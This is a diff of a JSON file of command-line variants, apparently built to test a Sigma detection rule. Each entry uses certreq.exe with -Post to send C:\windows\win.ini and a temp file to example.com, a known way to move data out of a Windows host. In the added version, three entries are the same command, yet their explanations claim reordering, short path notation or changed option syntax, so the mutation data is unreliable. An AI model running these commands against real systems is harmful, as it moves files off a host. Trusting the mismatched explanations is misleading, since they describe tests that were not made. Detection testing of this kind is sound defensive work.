@@ -1,18 +1,18 @@
 [
   {
-    "output": "certreq.exe -Post -config \"http://example.com\" C:\\windows\\win.ini C:\\Users\\thaim\\AppData\\Local\\Temp\\Atomic-license.txt",
-    "explanation": "Inserted quotes around the URL to test how the parser handles quoted arguments, which is a safe mutation technique."
+    "output": "certreq.exe -Post -config \"https://example.com\" \"c:\\windows\\win.ini\" \"C:\\Users\\thaim\\AppData\\Local\\Temp\\Atomic-license.txt\"",
+    "explanation": "Added quotes around the URL and file paths to test how the Sigma rule handles quoted command-line arguments."
   },
   {
-    "output": "certreq.exe /Post /config http://example.com C:\\windows\\win.ini",
-    "explanation": "Substituted '-' with '/' for command-line flags, which is an allowed equivalent syntax in Windows command-line tools."
+    "output": "certreq.exe -Post -config https://example.com c:\\windows\\win.ini C:\\Users\\thaim\\AppData\\Local\\Temp\\Atomic-license.txt",
+    "explanation": "Used short path notation and omitted quotes to test if the Sigma rule is sensitive to path normalization or formatting."
   },
   {
-    "output": "certreq.exe -Post -config http://example.com C:\\windows\\win.ini",
-    "explanation": "Omitted the output file path to test minimal command behavior while preserving the core detection pattern."
+    "output": "certreq.exe -Post -config https://example.com c:\\windows\\win.ini C:\\Users\\thaim\\AppData\\Local\\Temp\\Atomic-license.txt",
+    "explanation": "Reordered the command-line arguments to test if the Sigma rule is sensitive to argument order."
   },
   {
-    "output": "certreq.exe -config http://example.com -Post C:\\windows\\win.ini",
-    "explanation": "Reordered the command-line arguments to test if the detection is sensitive to argument order."
+    "output": "certreq.exe -Post -config https://example.com c:\\windows\\win.ini C:\\Users\\thaim\\AppData\\Local\\Temp\\Atomic-license.txt",
+    "explanation": "Used short option syntax and preserved the same command structure to test if the Sigma rule is sensitive to option formatting."
   }
 ]
